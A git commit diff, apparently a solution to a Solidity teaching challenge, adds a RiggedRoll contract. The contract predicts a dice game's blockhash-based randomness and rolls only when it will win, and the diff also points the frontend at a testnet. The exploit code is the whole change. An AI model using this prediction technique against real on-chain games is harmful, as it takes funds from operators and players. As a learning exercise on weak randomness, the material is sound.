0bf98efd5f522ba82ac5f97eca67c6ae8f998d2f
wheatwaves <SpaceOdyssey2077@gmail.com>
2022-09-03 22:12:56 -0700

    finish challenge 3

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -14,11 +14,25 @@ contract RiggedRoll is Ownable {
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
-
+    function withdraw(address _addr, uint256 _amount) public onlyOwner {
+        (bool sent, bytes memory data) = _addr.call{value: _amount}("");
+        require(sent);
+    }
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public {
+        require(address(this).balance >= 0.002 ether);
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+        uint256 roll = uint256(hash) % 16;
+        require(roll <= 2);
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
 
 
     //Add receive() function so contract can receive Eth
+    receive() external payable {
+
+    }
     
 }
--- packages/react-app/src/App.jsx
+++ packages/react-app/src/App.jsx
@@ -60,7 +60,7 @@ const { ethers } = require("ethers");
 */
 
 /// 📡 What chain are your contracts deployed to?
-const targetNetwork = NETWORKS.localhost; // <------- select your target frontend network (localhost, rinkeby, xdai, mainnet)
+const targetNetwork = NETWORKS.rinkeby; // <------- select your target frontend network (localhost, rinkeby, xdai, mainnet)
 
 // 😬 Sorry for all the console logging
 const DEBUG = true;
@@ -474,7 +474,6 @@ function App(props) {
     });
   };
 
-    /*
   const riggedRoll = async () => {
     tx(writeContracts.RiggedRoll.riggedRoll({ gasLimit: 500000 }), update => {
       console.log("TX UPDATE", update);
@@ -503,7 +502,6 @@ function App(props) {
       setDiceRolled(false);
     }
   });
-*/
 
   const filter = readContracts.DiceGame?.filters.Roll(address, null);
 
